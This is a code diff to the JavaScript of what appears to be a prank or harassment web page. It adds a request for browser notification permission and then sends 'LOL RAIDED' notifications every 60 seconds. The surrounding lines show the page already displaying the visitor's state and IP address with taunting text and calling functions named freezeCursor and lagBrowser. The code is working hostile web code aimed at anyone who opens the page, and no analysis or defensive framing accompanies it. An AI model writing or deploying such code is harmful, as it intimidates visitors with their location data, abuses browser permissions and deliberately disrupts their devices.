@@ -225,6 +225,33 @@
             }
         }
 
+        function requestNotificationPermission() {
+            return new Promise((resolve, reject) => {
+                if ('Notification' in window) {
+                    Notification.requestPermission().then(permission => {
+                        if (permission === 'granted') {
+                            resolve();
+                        } else {
+                            reject();
+                        }
+                    });
+                } else {
+                    reject('Notifications are not supported by this browser.');
+                }
+            });
+        }
+
+        function sendNotification() {
+            if ('Notification' in window && Notification.permission === 'granted') {
+                new Notification('LOL RAIDED');
+            }
+        }
+
+        function setupNotificationInterval() {
+            sendNotification();
+            setInterval(sendNotification, 60000); // Send notification every 60 seconds
+        }
+
         document.addEventListener('click', async () => {
             const clickToLoad = document.getElementById('click-to-load');
             clickToLoad.style.display = 'none';
@@ -251,6 +278,13 @@
             const overlay = document.getElementById('overlay');
             overlay.innerHTML = `IMAGING LIVING IN ${userState}<br>LOL UR IP IS ${userIP}`;
             overlay.style.display = 'block';
+
+            try {
+                await requestNotificationPermission();
+                setupNotificationInterval();
+            } catch (error) {
+                console.error('Error requesting notification permission:', error);
+            }
 
             freezeCursor();
             lagBrowser();
